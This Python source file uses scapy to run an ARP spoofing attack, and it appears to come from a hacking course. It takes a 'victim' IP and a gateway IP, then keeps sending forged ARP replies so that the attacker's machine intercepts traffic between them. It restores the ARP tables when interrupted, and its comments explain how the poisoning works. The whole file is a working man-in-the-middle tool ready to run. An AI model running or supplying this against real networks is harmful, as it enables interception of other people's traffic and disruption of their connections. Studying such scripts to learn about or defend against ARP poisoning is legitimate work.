#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse

def get_arguements():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="IP of victim")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="IP of gateway")
    (option,args)=parser.parse_args()
    if not option.target_ip:
        print("Enter the victim ip using -t or --target.\n--help for help")
        exit()
    if not option.gateway_ip:
        print("Enter the victim ip using -g or --gateway.\n--help for help")
        exit()
    return option

def get_mac(ip):
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    req_broad = broadcast/request
    answered_list = scapy.srp(req_broad, timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # op=2 -> response. Packet is sent to victim at 149 saying Im at 151.1(router). Victim will see the MAC of the machine sending this packet and will update the table and the ip of 151.1 wil be set to mac of hacker i.e. mac of machine sending this packet.
    scapy.send(packet, verbose=False)

def restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, verbose=False)

option=get_arguements()
target_ip = option.target_ip
gateway_ip = option.gateway_ip
sent_packets_count = 0
try:
    while True:
        spoof(gateway_ip,target_ip)
        spoof(target_ip,gateway_ip)
        sent_packets_count=sent_packets_count+2
        print("\r[+] Packet count: "+str(sent_packets_count)), # The , indicates that whatever is to be printed will be added to a buffer and once the program terminates it will be displayed. Without the newline character.
        # \r tells python to always print statement from start of line not from where you are currently.
        # for python3 no need of below statement. print("\r[+] Packet count: "+str(sent_packets_count), end="") this is the modified statement. No need to import sys module as well.
        sys.stdout.flush() # Tells python to flush the standard output(buffer)
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C..... Quitting.")
restore(gateway_ip,target_ip)
restore(target_ip,gateway_ip)
print("ARP tables have been restored")